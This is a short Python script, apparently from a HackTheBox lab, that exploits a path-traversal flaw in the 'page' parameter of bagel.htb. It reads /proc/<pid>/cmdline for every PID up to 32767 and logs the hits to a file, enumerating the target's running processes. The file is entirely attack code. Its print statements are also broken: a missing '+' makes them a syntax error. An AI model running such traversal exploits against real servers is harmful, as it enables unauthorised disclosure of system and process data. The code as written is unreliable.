import requests

pid = 32768
url = "http://bagel.htb:8000/?page=../../../../proc/"


for i in range(0, pid):
	req = requests.get(url + str(i) + "/cmdline")
	
#tests to see if the process is an empty process or not, if it isnt, itll write to list.txt
	if str(req.content) != "b'File not found'" and str(req.content) != "b''":
		print("PID " + str(i) + " has WORKED! url= " url + str(i) + "/cmdline")
		open('list.txt', 'a').write(str(req.content) + "\n")
		
		pass
	
	else:
		print("PID " + str(i) + " did not work! url = " url + str(i) + "/cmdline")